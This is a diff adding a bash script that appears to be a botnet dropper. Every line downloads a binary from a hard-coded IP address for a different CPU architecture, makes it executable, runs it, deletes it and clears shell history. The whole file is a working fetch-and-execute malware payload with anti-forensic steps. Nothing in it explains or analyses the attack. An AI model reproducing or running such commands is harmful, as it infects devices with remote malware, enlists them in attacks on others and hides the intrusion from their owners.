@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.mips; chmod +x jiren.mips; ./jiren.mips; rm -rf jiren.mips;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.mpsl; chmod +x jiren.mpsl; ./jiren.mpsl; rm -rf jiren.mpsl;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.sh4; chmod +x jiren.sh4; ./jiren.sh4; rm -rf jiren.sh4;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.x86; chmod +x jiren.x86; ./jiren.x86; rm -rf jiren.x86;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.arm6; chmod +x jiren.arm6; ./jiren.arm6; rm -rf jiren.arm6;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.i686; chmod +x jiren.i686; ./jiren.i686; rm -rf jiren.i686;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.ppc; chmod +x jiren.ppc; ./jiren.ppc; rm -rf jiren.ppc;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.i586; chmod +x jiren.i586; ./jiren.i586; rm -rf jiren.i586;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.m68k; chmod +x jiren.m68k; ./jiren.m68k; rm -rf jiren.m68k;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.sparc; chmod +x jiren.sparc; ./jiren.sparc; rm -rf jiren.sparc;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.arm4; chmod +x jiren.arm4; ./jiren.arm4; rm -rf jiren.arm4;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.arm5; chmod +x jiren.arm5; ./jiren.arm5; rm -rf jiren.arm5;history -c
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.153.211/jdabfsjkhfasl/jiren.arm7; chmod +x jiren.arm7; ./jiren.arm7; rm -rf jiren.arm7;history -c
